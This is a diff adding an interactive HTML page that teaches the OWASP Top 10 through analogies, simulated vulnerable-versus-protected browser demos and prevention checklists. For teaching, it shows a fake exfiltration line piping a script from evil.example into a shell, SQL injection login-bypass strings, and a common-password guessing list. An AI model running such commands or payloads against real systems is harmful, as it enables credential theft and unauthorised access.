@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OWASP Top 10 Explained</title>
+<style>
+:root{
+  --bg:#f6f7fb; --card:#fff; --ink:#1b2133; --muted:#5d667d; --line:#e2e6f0;
+  --accent:#4f46e5; --accent-ink:#fff;
+  --bad:#d92d3a; --bad-bg:#fdecee; --good:#118a4a; --good-bg:#e5f6ec;
+  --warn-bg:#fff6df; --code:#0f172a; --code-ink:#e2e8f0;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0e1220; --card:#171c2e; --ink:#e8ebf5; --muted:#9aa3bd; --line:#2a3150;
+    --accent:#818cf8; --accent-ink:#0e1220;
+    --bad:#ff6b76; --bad-bg:#3a1a22; --good:#4ade80; --good-bg:#12311f;
+    --warn-bg:#3a3014; --code:#0a0e1a; --code-ink:#d6def0;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0e1220; --card:#171c2e; --ink:#e8ebf5; --muted:#9aa3bd; --line:#2a3150;
+  --accent:#818cf8; --accent-ink:#0e1220;
+  --bad:#ff6b76; --bad-bg:#3a1a22; --good:#4ade80; --good-bg:#12311f;
+  --warn-bg:#3a3014; --code:#0a0e1a; --code-ink:#d6def0;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+.wrap{max-width:900px;margin:0 auto;padding:0 16px}
+header.hero{padding:40px 0 20px}
+.hero h1{font-size:clamp(28px,5vw,42px);line-height:1.15;margin:0 0 10px}
+.hero p{color:var(--muted);margin:0 0 14px;max-width:62ch}
+.topbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.btn{border:1px solid var(--line);background:var(--card);color:var(--ink);padding:8px 14px;border-radius:10px;font:inherit;font-size:14px;cursor:pointer}
+.btn:hover{border-color:var(--accent)}
+.btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-weight:600}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.progress{flex:1;min-width:180px}
+.bar{height:8px;background:var(--line);border-radius:99px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:var(--good);transition:width .3s}
+.progress small{color:var(--muted)}
+nav.chips{position:sticky;top:0;z-index:10;background:var(--bg);border-bottom:1px solid var(--line);padding:10px 0}
+nav.chips .row{display:flex;gap:6px;overflow-x:auto;scrollbar-width:thin;padding-bottom:2px}
+nav.chips a{flex:none;text-decoration:none;color:var(--ink);font-size:13px;font-weight:600;border:1px solid var(--line);background:var(--card);padding:5px 10px;border-radius:99px}
+nav.chips a.on{background:var(--accent);color:var(--accent-ink);border-color:var(--accent)}
+nav.chips a.done::after{content:" ✓";color:var(--good)}
+nav.chips a.on.done::after{color:var(--accent-ink)}
+.legend{display:flex;gap:16px;flex-wrap:wrap;font-size:14px;color:var(--muted);margin:18px 0}
+article.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;margin:0 0 22px}
+.card header{display:flex;gap:14px;align-items:flex-start}
+.badge{flex:none;width:52px;height:52px;border-radius:14px;background:var(--accent);color:var(--accent-ink);display:grid;place-items:center;font-weight:800;font-size:15px}
+.card h2{margin:0;font-size:22px;line-height:1.25}
+.tag{color:var(--muted);font-size:14px;margin-top:2px}
+.analogy{margin:16px 0;padding:12px 14px;background:var(--warn-bg);border-radius:12px;font-size:15px}
+.analogy b{display:block;margin-bottom:2px}
+.sec{margin:16px 0 6px;font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:700}
+.demo{border:1px dashed var(--line);border-radius:12px;padding:14px}
+.seg{display:inline-flex;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:12px}
+.seg button{border:0;background:transparent;color:var(--ink);font:inherit;font-size:14px;padding:7px 12px;cursor:pointer}
+.seg button.on[data-m="bad"]{background:var(--bad);color:#fff}
+.seg button.on[data-m="good"]{background:var(--good);color:#fff}
+.demo p.hint{margin:0 0 10px;font-size:14px;color:var(--muted)}
+.field{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
+.field input,.field select{font:inherit;font-size:14px;padding:8px 10px;border-radius:8px;border:1px solid var(--line);background:var(--bg);color:var(--ink);min-width:0;flex:1 1 140px}
+.field label{font-size:14px;color:var(--muted)}
+pre,.code{background:var(--code);color:var(--code-ink);border-radius:10px;padding:10px 12px;font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;overflow-x:auto;margin:8px 0;white-space:pre-wrap;word-break:break-word}
+.out{margin-top:10px;padding:11px 13px;border-radius:10px;font-size:14px;display:none}
+.out.show{display:block}
+.out.bad{background:var(--bad-bg);color:var(--bad);border:1px solid var(--bad)}
+.out.good{background:var(--good-bg);color:var(--good);border:1px solid var(--good)}
+.out b{color:inherit}
+.out .code,.out pre{color:var(--code-ink)}
+.prev ul{margin:0;padding-left:20px}
+.prev li{margin:4px 0}
+.fix{display:grid;gap:6px}
+.fix div{display:flex;gap:8px;font-size:15px}
+.fix div::before{content:"🛡️"}
+footer{padding:20px 0 60px;color:var(--muted);font-size:14px}
+.understood{margin-top:16px;display:flex;align-items:center;gap:8px;font-size:14px}
+.meter{height:10px;background:var(--line);border-radius:99px;overflow:hidden;margin:8px 0}
+.meter i{display:block;height:100%;width:0;background:var(--bad);transition:width .1s}
+.tree{font:13px ui-monospace,Menlo,monospace;line-height:1.8}
+.tree .evil{color:var(--bad);font-weight:700}
+@media (max-width:520px){article.card{padding:16px}.badge{width:44px;height:44px}}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <header class="hero">
+    <h1>🔐 OWASP Top 10, explained simply</h1>
+    <p>The 10 most common ways websites get hacked, each with an everyday analogy, a tiny live demo you can break and fix, and a short prevention checklist. Based on the OWASP Top 10:2025 list.</p>
+    <div class="topbar">
+      <div class="progress">
+        <div class="bar"><i id="pbar"></i></div>
+        <small id="ptext">0 of 10 understood</small>
+      </div>
+      <button class="btn" id="theme">🌓 Theme</button>
+    </div>
+  </header>
+</div>
+
+<nav class="chips"><div class="wrap"><div class="row" id="chips"></div></div></nav>
+
+<main class="wrap">
+  <div class="legend">
+    <span>😈 <b>Vulnerable</b> = how a careless app behaves</span>
+    <span>🛡️ <b>Protected</b> = how a safe app behaves</span>
+    <span>Flip the switch in each demo and click the buttons.</span>
+  </div>
+  <div id="cards"></div>
+  <footer>Educational demo only. Everything here is simulated in your browser; nothing is sent anywhere. Source: owasp.org/Top10</footer>
+</main>
+
+<script>
+const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+/* Each item: id, title, tag, analogy, demo(html), bind(card, mode()), prevent[] */
+const ITEMS = [
+{
+  id:'A01', title:'Broken Access Control', tag:'Users can do things they should not be allowed to do.',
+  analogy:['🏨 Hotel key card','Your key card opens room 101. If it also opens 102, 103 and the manager office, access control is broken. The lock must check <i>who you are</i>, not just that you have a card.'],
+  hint:'You are Alice (id 1001). Change the invoice number in the URL to peek at other customers.',
+  demo:`<div class="code">GET /invoice?id=<span id="a01url">1001</span></div>
+    <div class="field"><input id="a01id" type="number" value="1001" aria-label="Invoice id"><button class="btn primary" id="a01go">Open invoice</button></div>`,
+  bind(c,mode){
+    const data={1001:['Alice','$40 · Coffee beans'],1002:['Bob','$1,200 · Salary advance'],1003:['Carol','$9,800 · Medical bill']};
+    c.$('#a01go').onclick=()=>{
+      const id=c.$('#a01id').value; c.$('#a01url').textContent=id;
+      const r=data[id];
+      if(!r) return c.out('good','Invoice not found.');
+      if(mode()==='good' && id!=='1001') return c.out('good','<b>403 Forbidden.</b> The server checked: this invoice does not belong to Alice.');
+      if(id==='1001') return c.out('good','Alice\'s own invoice: '+esc(r[1]));
+      c.out('bad','<b>Data leak!</b> Alice just read '+esc(r[0])+'\'s invoice: '+esc(r[1])+'. The server never asked "is this yours?".');
+    };
+  },
+  prevent:['Deny by default; allow only what is explicitly permitted.','Check ownership/permission on the SERVER for every request, never trust the URL or hidden fields.','Use unpredictable IDs, but still enforce the checks.','Log access failures and alert on repeated ones.']
+},
+{
+  id:'A02', title:'Security Misconfiguration', tag:'Safe software set up in an unsafe way.',
+  analogy:['🏠 Spare key under the mat','A strong front door is useless if the default code is 0000, a window is left open and the manual says where the spare key is. Defaults are public knowledge.'],
+  hint:'Try the default admin login and trigger a server error.',
+  demo:`<div class="field"><button class="btn" id="a02login">Login /admin with admin / admin</button><button class="btn" id="a02err">Trigger an error</button></div>`,
+  bind(c,mode){
+    c.$('#a02login').onclick=()=> mode()==='bad'
+      ? c.out('bad','<b>Welcome, admin!</b> The default password was never changed, so anybody on the internet is now an administrator.')
+      : c.out('good','<b>Login refused.</b> Default accounts are removed, unique strong passwords are required, admin panel is not public.');
+    c.$('#a02err').onclick=()=> mode()==='bad'
+      ? c.out('bad','<b>Debug mode ON</b> shows internals to attackers:<pre>Traceback: /app/db.py line 42\nconnect(host="10.0.0.5", user="root", password="Sup3rS3cret!")\nServer: Apache 2.2.15 (outdated)</pre>')
+      : c.out('good','<b>Something went wrong. (ref: 7F3A)</b> Users see a friendly message; details stay in private server logs.');
+  },
+  prevent:['Remove default accounts, sample apps and unused features.','Turn off debug mode and verbose errors in production.','Automate hardened configs (same for dev, test, prod) and review them.','Add security headers; keep cloud storage private by default.']
+},
+{
+  id:'A03', title:'Software Supply Chain Failures', tag:'Danger hidden in the libraries and tools you depend on.',
+  analogy:['🍕 Pizza ingredients','You cook perfectly, but if the flour supplier is contaminated, your pizza makes people sick. Your app is built from hundreds of other people\'s packages, build tools and updates.'],
+  hint:'Your app depends on a small package. An attacker has hijacked its newest version. Run the update.',
+  demo:`<div class="tree">my-shop<br>&nbsp;└─ web-utils 2.1.0<br>&nbsp;&nbsp;&nbsp;&nbsp;└─ tiny-color <span id="a03v">1.0.0</span></div>
+    <div class="field"><button class="btn primary" id="a03go">npm update</button></div>`,
+  bind(c,mode){
+    c.$('#a03go').onclick=()=> mode()==='bad'
+      ? c.out('bad','<b>Installed tiny-color 1.0.1</b> (hijacked). Its install script quietly runs:<pre>curl evil.example/steal.sh | sh   # sends your API keys</pre>No one reviewed the update, so your secrets are gone.')
+      : c.out('good','<b>Update blocked.</b> The lockfile hash for tiny-color 1.0.1 does not match the trusted one, and the scanner flagged it. You review before upgrading.');
+  },
+  prevent:['Keep an inventory (SBOM) of every dependency, including indirect ones.','Pin versions with a lockfile and verify integrity hashes.','Scan dependencies continuously and update on a schedule, not blindly.','Protect your build pipeline and package accounts with MFA.']
+},
+{
+  id:'A04', title:'Cryptographic Failures', tag:'Sensitive data not protected, or protected badly.',
+  analogy:['✉️ Postcard vs sealed envelope','Writing your password on a postcard means every mail carrier can read it. Encryption and hashing are the sealed envelope: leaked data stays unreadable.'],
+  hint:'Imagine the database is stolen. What does the hacker see for this password?',
+  demo:`<div class="field"><input id="a04pw" value="MyDogRex2024" aria-label="Password"><button class="btn primary" id="a04go">Save &amp; leak DB</button></div>`,
+  bind(c,mode){
+    c.$('#a04go').onclick=async()=>{
+      const pw=c.$('#a04pw').value;
+      if(mode()==='bad') return c.out('bad','<b>Stolen table</b><pre>user: alice\npassword: '+esc(pw)+'</pre>Stored as plain text: attacker reads it instantly and tries it on your email and bank.');
+      const salt=crypto.getRandomValues(new Uint8Array(8));
+      const buf=await crypto.subtle.digest('SHA-256',new Uint8Array([...salt,...new TextEncoder().encode(pw)]));
+      const hex=a=>[...new Uint8Array(a)].map(b=>b.toString(16).padStart(2,'0')).join('');
+      c.out('good','<b>Stolen table</b><pre>user: alice\npassword: '+hex(salt)+'$'+hex(buf).slice(0,40)+'…</pre>Salted hash: unreadable. (Real apps should use a slow hash such as Argon2 or bcrypt; SHA-256 here is only for the demo.) Use HTTPS too.');
+    };
+  },
+  prevent:['Encrypt data in transit (HTTPS/TLS) and at rest.','Hash passwords with Argon2/bcrypt + salt. Never invent your own crypto.','Do not collect or keep sensitive data you do not need.','Protect keys: rotate them and keep them out of source code.']
+},
+{
+  id:'A05', title:'Injection', tag:'Attacker data is run as a command.',
+  analogy:['📝 Fill-in-the-blank order form','A waiter reads your note aloud to the chef. You write "one soup. Also give me the cash register." If the waiter obeys the whole sentence, you have injected a command into the data.'],
+  hint:'Log in as the admin without knowing the password. Try the username:  admin\' --   or password:  \' OR \'1\'=\'1',
+  demo:`<div class="field"><input id="a05u" placeholder="username" value="admin"><input id="a05p" placeholder="password" value="wrong"></div>
+    <div class="field"><button class="btn primary" id="a05go">Log in</button></div>`,
+  bind(c,mode){
+    c.$('#a05go').onclick=()=>{
+      const u=c.$('#a05u').value,p=c.$('#a05p').value;
+      if(mode()==='bad'){
+        const q="SELECT * FROM users WHERE name='"+u+"' AND pass='"+p+"'";
+        const hit=/'\s*or\s+.+=.+|--|;/i.test(u+' '+p) || /'\s*or\b/i.test(u+p);
+        return hit
+          ? c.out('bad','<b>Logged in as ADMIN</b> without a password!<pre>'+esc(q)+'</pre>Your text became part of the SQL code.')
+          : c.out('good','Normal failed login.<pre>'+esc(q)+'</pre>');
+      }
+      c.out('good','<b>Login failed.</b> Query is fixed, input is only data:<pre>SELECT * FROM users WHERE name = ? AND pass = ?\n? = '+JSON.stringify(u)+'\n? = '+JSON.stringify(p)+'</pre>');
+    };
+  },
+  prevent:['Use parameterized queries / prepared statements / ORM, never string concatenation.','Validate input (allow-lists) and escape output (prevents XSS too).','Give the database account minimum privileges.','Same idea applies to OS commands, LDAP, NoSQL and HTML.']
+},
+{
+  id:'A06', title:'Insecure Design', tag:'The plan itself is flawed, not just the code.',
+  analogy:['🏦 Bank vault with no alarm','You can build the door perfectly, but if the blueprint says "unlimited guesses on the combination", no bug-free code will save you. Security must be designed in from the start.'],
+  hint:'Password reset uses a secret 4-digit code (10,000 possibilities). Let an attacker guess.',
+  demo:`<div class="field"><button class="btn primary" id="a06go">Start guessing codes</button></div>
+    <div class="meter"><i id="a06bar"></i></div><div class="tag" id="a06txt">Attempts: 0</div>`,
+  bind(c,mode){
+    const btn=c.$('#a06go');
+    btn.onclick=async()=>{
+      btn.disabled=true; const secret=Math.floor(Math.random()*10000), limit=5;
+      let tries=0, cracked=false;
+      for(let g=0; g<10000; g+= 97){            // jump for speed, still counts as many guesses
+        tries=Math.min(g+97,10000);
+        c.$('#a06bar').style.width=(tries/100)+'%'; c.$('#a06txt').textContent='Attempts: '+tries;
+        if(mode()==='good' && tries>limit){ c.out('good','<b>Locked after '+limit+' wrong tries.</b> The design includes rate limiting, expiring codes and an alert to the real owner. Brute force becomes impossible.'); btn.disabled=false; return; }
+        if(secret<tries){ cracked=true; break; }
+        await sleep(15);
+      }
+      c.$('#a06txt').textContent='Attempts: '+Math.min(secret+1,tries);
+      c.out('bad','<b>Account taken over.</b> Code <code>'+String(secret).padStart(4,'0')+'</code> found in seconds. The design allowed unlimited guesses.');
+      btn.disabled=false;
+    };
+  },
+  prevent:['Threat-model early: ask "how could this feature be abused?"','Add rate limits, lockouts and limits on resource use by design.','Use secure design patterns and reference architectures.','Write abuse cases and tests, not only happy-path tests.']
+},
+{
+  id:'A07', title:'Authentication Failures', tag:'Weak proof of who you are.',
+  analogy:['🛂 Border control that waves everyone through','If the guard accepts "I am the president" with no passport, never limits attempts, and accepts "123456" as a secret, anyone can pretend to be anyone.'],
+  hint:'An attacker tries a list of common/leaked passwords against Alice\'s account (her password is "password1").',
+  demo:`<div class="field"><button class="btn primary" id="a07go">Run password-guessing attack</button></div><div class="code" id="a07log">attempts will appear here…</div>`,
+  bind(c,mode){
+    const list=['123456','qwerty','letmein','admin','welcome','password','iloveyou','password1'];
+    c.$('#a07go').onclick=async()=>{
+      const log=c.$('#a07log'); log.textContent='';
+      for(let i=0;i<list.length;i++){
+        await sleep(250);
+        const pw=list[i];
+        if(mode()==='good' && i>=5){ log.textContent+='✖ account locked after 5 failures, attacker blocked\n'; return c.out('good','<b>Attack stopped.</b> Lockout/throttling, plus a breached-password check. Even a correct password would still need a 2nd factor (MFA).'); }
+        if(pw==='password1'){ log.textContent+='✔ "'+pw+'" accepted\n'; return c.out('bad','<b>Account compromised</b> after only '+(i+1)+' guesses. No lockout, no MFA, and a weak password was allowed.'); }
+        log.textContent+='✖ "'+pw+'" rejected\n';
+      }
+    };
+  },
+  prevent:['Require multi-factor authentication (MFA).','Block weak and breached passwords; no default credentials.','Rate-limit and lock out repeated failures.','Use secure, random, expiring session IDs and log users out properly.']
+},
+{
+  id:'A08', title:'Software or Data Integrity Failures', tag:'Trusting code or data without checking it was not changed.',
+  analogy:['💊 Medicine with a broken seal','You would not swallow pills from a bottle whose safety seal is torn. Software updates need a seal (signature/hash) that proves nobody tampered with them.'],
+  hint:'The app downloads an update. An attacker swaps the file on the way.',
+  demo:`<div class="field"><label><input type="checkbox" id="a08t" checked> Attacker tampers with update.zip</label></div>
+    <div class="field"><button class="btn primary" id="a08go">Install update</button></div>`,
+  bind(c,mode){
+    c.$('#a08go').onclick=()=>{
+      const t=c.$('#a08t').checked;
+      if(!t) return c.out('good','Update installed. Signature valid, hash matches.');
+      mode()==='bad'
+        ? c.out('bad','<b>Malicious update installed.</b> Expected hash was never compared. The app runs the attacker\'s code on every customer machine.')
+        : c.out('good','<b>Install refused.</b><pre>expected sha256: 9f2c…a1\nreceived sha256: 03be…77  ≠ MISMATCH</pre>Signed updates are verified before running.');
+    };
+  },
+  prevent:['Verify digital signatures/hashes of updates, plugins and packages.','Never deserialize untrusted data; use safe formats like plain JSON.','Review CI/CD changes and restrict who can push to the pipeline.','Use trusted repositories and subresource integrity for CDN scripts.']
+},
+{
+  id:'A09', title:'Security Logging & Alerting Failures', tag:'Attacks happen and nobody notices.',
+  analogy:['📹 Security camera that is not recording','A thief walks in for six months. With no recording and no alarm, you only find out when the shelves are empty. Detect fast, respond fast.'],
+  hint:'An attacker hammers the login page. Does the security team find out?',
+  demo:`<div class="field"><button class="btn primary" id="a09go">Simulate attack</button></div><div class="code" id="a09log">server log…</div>`,
+  bind(c,mode){
+    c.$('#a09go').onclick=async()=>{
+      const log=c.$('#a09log'); log.textContent='';
+      for(let i=1;i<=6;i++){
+        await sleep(300);
+        if(mode()==='good') log.textContent+='[WARN] failed login admin from 203.0.113.9 (#'+i+')\n';
+      }
+      if(mode()==='bad'){ log.textContent='(nothing logged)'; return c.out('bad','<b>Silence.</b> 6 attacks, 0 logs, 0 alerts. The breach is discovered months later (the industry average is very long).'); }
+      log.textContent+='[ALERT] 6 failures in 2s → IP blocked, on-call notified\n';
+      c.out('good','<b>Detected in seconds.</b> Logs are structured, centralized and tied to alerts, so the team responds before damage.');
+    };
+  },
+  prevent:['Log logins, access failures and high-value actions with who/what/when.','Send logs to a central, tamper-resistant place.','Create alerts and a rehearsed incident response plan.','Never log secrets or passwords.']
+},
+{
+  id:'A10', title:'Mishandling of Exceptional Conditions', tag:'Apps behave unsafely when something goes wrong.',
+  analogy:['🚪 Electronic door in a power cut','If the lock "fails open" in a blackout, everyone walks in. Safe systems "fail closed": when unsure, they deny and tell the user calmly.'],
+  hint:'The fraud-check service is down at the moment someone pays $5,000.',
+  demo:`<div class="code">order $5,000 → fraud-check service: <span style="color:#ff6b76">TIMEOUT</span></div>
+    <div class="field"><button class="btn primary" id="a10go">Pay $5,000</button></div>`,
+  bind(c,mode){
+    c.$('#a10go').onclick=()=> mode()==='bad'
+      ? c.out('bad','<b>Order approved without any check.</b><pre>try { check() } catch { /* ignore */ }  // fail-open</pre>Attackers learn to crash the checker on purpose.')
+      : c.out('good','<b>Payment on hold.</b> The error is caught, the system fails <i>closed</i>, the order is queued for review and the user sees: "We\'ll confirm shortly." Nothing leaks.');
+  },
+  prevent:['Catch errors everywhere and handle them explicitly.','Fail closed: deny access when a check cannot complete.','Roll back half-finished transactions.','Show generic messages to users; keep details in logs.']
+}
+];
+
+/* ---------- render ---------- */
+const cardsEl=document.getElementById('cards'), chipsEl=document.getElementById('chips');
+const done=new Set();
+
+ITEMS.forEach(it=>{
+  const chip=document.createElement('a'); chip.href='#'+it.id; chip.textContent=it.id; chip.dataset.id=it.id; chipsEl.appendChild(chip);
+
+  const el=document.createElement('article'); el.className='card'; el.id=it.id;
+  el.innerHTML=`
+    <header><div class="badge">${it.id}</div><div><h2>${it.title}</h2><div class="tag">${it.tag}</div></div></header>
+    <div class="analogy"><b>${it.analogy[0]}</b>${it.analogy[1]}</div>
+    <div class="sec">Try it</div>
+    <div class="demo">
+      <div class="seg" role="group" aria-label="Mode">
+        <button data-m="bad" class="on">😈 Vulnerable</button>
+        <button data-m="good">🛡️ Protected</button>
+      </div>
+      <p class="hint">${it.hint}</p>
+      ${it.demo}
+      <div class="out" role="status"></div>
+    </div>
+    <div class="sec">How to prevent it</div>
+    <div class="fix prev">${it.prevent.map(p=>'<div>'+p+'</div>').join('')}</div>
+    <label class="understood"><input type="checkbox"> I understand this one</label>`;
+  cardsEl.appendChild(el);
+
+  let m='bad';
+  el.$=s=>el.querySelector(s);
+  const outEl=el.$('.out');
+  el.out=(cls,html)=>{ outEl.className='out show '+cls; outEl.innerHTML=html; };
+  el.querySelectorAll('.seg button').forEach(b=>b.onclick=()=>{
+    m=b.dataset.m; el.querySelectorAll('.seg button').forEach(x=>x.classList.toggle('on',x===b));
+    outEl.className='out'; outEl.innerHTML='';
+  });
+  it.bind(el,()=>m);
+  el.$('.understood input').onchange=e=>{
+    e.target.checked?done.add(it.id):done.delete(it.id);
+    chip.classList.toggle('done',e.target.checked);
+    document.getElementById('pbar').style.width=done.size*10+'%';
+    document.getElementById('ptext').textContent=done.size+' of 10 understood'+(done.size===10?' 🎉':'');
+  };
+});
+
+/* scroll spy */
+const chips=[...chipsEl.children];
+const spy=new IntersectionObserver(es=>es.forEach(e=>{
+  if(e.isIntersecting) chips.forEach(c=>{ const on=c.dataset.id===e.target.id; c.classList.toggle('on',on); if(on) c.scrollIntoView({block:'nearest',inline:'center'}); });
+}),{rootMargin:'-30% 0px -60% 0px'});
+document.querySelectorAll('article.card').forEach(a=>spy.observe(a));
+
+/* theme */
+document.getElementById('theme').onclick=()=>{
+  const r=document.documentElement, dark=getComputedStyle(r).getPropertyValue('--bg').trim()==='#0e1220';
+  r.dataset.theme=dark?'light':'dark';
+};
+</script>
+</body>
+</html>
